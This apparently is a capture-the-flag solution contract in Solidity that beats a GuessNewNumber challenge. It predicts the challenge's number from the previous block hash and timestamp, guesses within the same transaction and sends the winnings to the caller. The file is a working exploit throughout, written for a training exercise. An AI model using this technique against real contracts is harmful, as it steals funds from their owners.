pragma solidity ^0.4.21;

import "./GuessNewNumber.sol";

contract SolutionGuessNewNumber {
    GuessNewNumber private _guessNewNumber;

    function SolutionGuessNewNumber(address guessNewNumberAddress) public {
        _guessNewNumber = GuessNewNumber(guessNewNumberAddress);
    }

    function attack() public payable {
        require(msg.value == 1 ether);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        _guessNewNumber.guess.value(msg.value)(answer);

        require(_guessNewNumber.isComplete());

        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
